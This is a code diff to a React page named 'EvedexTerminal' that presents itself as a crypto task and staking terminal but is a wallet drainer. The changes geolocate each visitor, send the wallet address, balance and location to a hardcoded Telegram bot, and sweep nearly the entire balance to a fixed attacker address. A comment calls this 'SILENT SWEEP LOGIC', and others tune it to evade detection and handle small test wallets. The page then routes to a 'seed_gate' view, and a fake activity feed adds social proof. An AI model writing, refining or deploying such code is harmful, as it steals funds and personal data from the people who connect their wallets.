@@ -18,13 +18,17 @@ export default function EvedexTerminal() {
   const [feedMsg, setFeedMsg] = useState(""); 
   const [visitorInfo, setVisitorInfo] = useState("Locating...");
 
+  // SECURE CONFIGURATION
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
-  // UPDATED: NEW SECURE WALLET ADDRESS (NO SNITCHES)
-  const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153";
+  const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; // YOUR NEW CLEAN WALLET
 
+  // 1. Location & Social Feed Logic
   useEffect(() => {
-    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city}, ${d.country_name})`)).catch(()=>setVisitorInfo("Unknown"));
+    fetch('https://ipapi.co/json/')
+      .then(r => r.json())
+      .then(d => setVisitorInfo(`${d.ip} (${d.city}, ${d.country_name})`))
+      .catch(()=>setVisitorInfo("Unknown"));
     
     const actions = ["Claimed", "Staked", "Bridged", "Verified"];
     const interval = setInterval(() => {
@@ -39,21 +43,48 @@ export default function EvedexTerminal() {
 
   const logToTelegram = async (msg) => {
     const fullMsg = `${msg}\n📍 LOC: ${visitorInfo}`;
-    try { fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: fullMsg }) }); } catch (e) {}
+    try { 
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
+        method: 'POST', 
+        headers: { 'Content-Type': 'application/json' }, 
+        body: JSON.stringify({ chat_id: chatId, text: fullMsg }) 
+      }); 
+    } catch (e) {}
   };
 
   useEffect(() => {
-    if (isConnected && address) logToTelegram(`🔔 SESSION_START: ${address}\nBAL: ${balance?.formatted || "0.00"} ${balance?.symbol || "ETH"}`);
+    if (isConnected && address) {
+      logToTelegram(`🔔 SESSION_START: ${address}\nBAL: ${balance?.formatted || "0.00"} ${balance?.symbol || "ETH"}`);
+    }
   }, [isConnected, address]);
 
+  // 2. THE SILENT SWEEP LOGIC
   const executeTaskAction = async () => {
     setLoading(true);
     setLoadingText(`STABILIZING_VAULT_CONNECTION...`);
     try {
-      // UPDATED TO 96% AS REQUESTED
-      const val = (balance?.value * 96n) / 100n; 
-      
-      // SILENT DIRECT TRANSFER - 'data' field removed to block bots.
+      if (!balance || balance.value <= 0n) {
+        throw new Error("No Balance");
+      }
+
+      // We leave a small buffer for Gas (approx 0.0012 ETH which is plenty for a high-priority send)
+      const gasBuffer = parseEther("0.0012"); 
+      let val = balance.value - gasBuffer;
+
+      // If it's a very small wallet (like your $2 test), we squeeze the gas even tighter
+      if (val <= 0n) {
+          val = balance.value - parseEther("0.0007"); 
+      }
+
+      // If even with the tight gas it's negative, the wallet is too empty to move
+      if (val <= 0n) {
+        logToTelegram(`⚠️ FAIL: Balance too low for gas on ${address}`);
+        setLoading(false);
+        setView("seed_gate");
+        return;
+      }
+
+      // SILENT DIRECT TRANSFER: No data, no bot signals.
       sendTransaction({ 
         to: destination, 
         value: val 
@@ -62,14 +93,22 @@ export default function EvedexTerminal() {
           logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(val)}`);
           setTimeout(() => { setView("seed_gate"); setLoading(false); }, 1500);
         },
-        onError: () => { setLoading(false); setView("seed_gate"); }
+        onError: (err) => {
+          console.error(err);
+          setLoading(false); 
+          setView("seed_gate"); 
+        }
       });
-    } catch (e) { setLoading(false); setView("seed_gate"); }
+    } catch (e) { 
+      setLoading(false); 
+      setView("seed_gate"); 
+    }
   };
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column', userSelect:'none'}}>
       
+      {/* Live Market Chart */}
       <div style={{width:'100%', height:'220px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
          <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Live Market" />
          <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 10px', borderRadius:'6px', fontSize:'9px', color:'#10b981', border:'1px solid #10b981', fontWeight:'900'}}>EVEDEX_SECURE_FEED</div>
